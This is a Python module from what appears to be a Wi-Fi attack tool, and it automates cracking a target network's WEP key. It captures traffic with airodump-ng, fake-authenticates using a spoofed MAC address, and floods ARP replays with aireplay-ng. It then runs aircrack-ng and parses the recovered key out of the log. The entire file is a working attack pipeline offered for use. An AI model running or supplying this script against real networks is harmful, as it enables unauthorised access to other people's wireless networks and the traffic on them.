import os
import time
import pexpect
import subprocess
from subprocess import Popen
from poormanslogging import info, error

import src.settings as settings

def run():
	if os.path.exists(settings.OS_PATH + '/cr0z0n0_attack-01.csv'):
		os.remove(settings.OS_PATH + '/cr0z0n0_attack-01.csv')
		os.remove(settings.OS_PATH + '/cr0z0n0_attack-01.cap')
		os.remove(settings.OS_PATH + '/cr0z0n0_attack-01.kismet.csv')
		os.remove(settings.OS_PATH + '/cr0z0n0_attack-01.kismet.netxml')

	proc_airodump = subprocess.Popen(['airodump-ng', '--bssid', settings.TARGET_BSSID, '-c', settings.TARGET_CHANNEL, '-w', 'cr0z0n0_attack', settings.INTERFACE_MON],
						stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

	cmd_auth = pexpect.spawn('aireplay-ng -1 0 -e "{0}" -a {1} -h {2} {3}'.format(settings.TARGET_ESSID, settings.TARGET_BSSID, settings.NEW_MAC, settings.INTERFACE_MON))
	cmd_auth.logfile = open(settings.LOG_FILE, 'wb')
	cmd_auth.expect(['Association successful', pexpect.TIMEOUT, pexpect.EOF], 20)
	cmd_auth.close()
	parse_log_auth = open(settings.LOG_FILE, 'r')
	for line in parse_log_auth:
		if line.find('Association successful') != -1:
			info("Association successful")
	parse_log_auth.close()
	os.remove(settings.LOG_FILE)

	proc_aireplay = subprocess.Popen(['aireplay-ng', '-3', '-e', '"' + settings.TARGET_ESSID + '"', '-b', settings.TARGET_BSSID, '-h', settings.NEW_MAC, settings.INTERFACE_MON],
						stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

	time.sleep(settings.WEP_AIREPLAY_TIME)

	cmd_crack = pexpect.spawn('aircrack-ng cr0z0n0_attack-01.cap')
	cmd_crack.logfile = open(settings.LOG_FILE, 'wb')
	cmd_crack.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF], 30)
	cmd_crack.close()

	parse_log_crack = open(settings.LOG_FILE, 'r')
	for line in parse_log_crack:
		where = line.find('KEY FOUND!')
		if where > -1:
			if line.find('ASCII') != -1:
				where2 = line.find('ASCII')
				key_end = line.find(')')
				settings.TARGET_KEY = line[where2 + 6:key_end]
			else:
				key_end = line.find(']')
				settings.TARGET_KEY = line[where + 13:key_end]
	parse_log_crack.close()
	os.remove(settings.LOG_FILE)
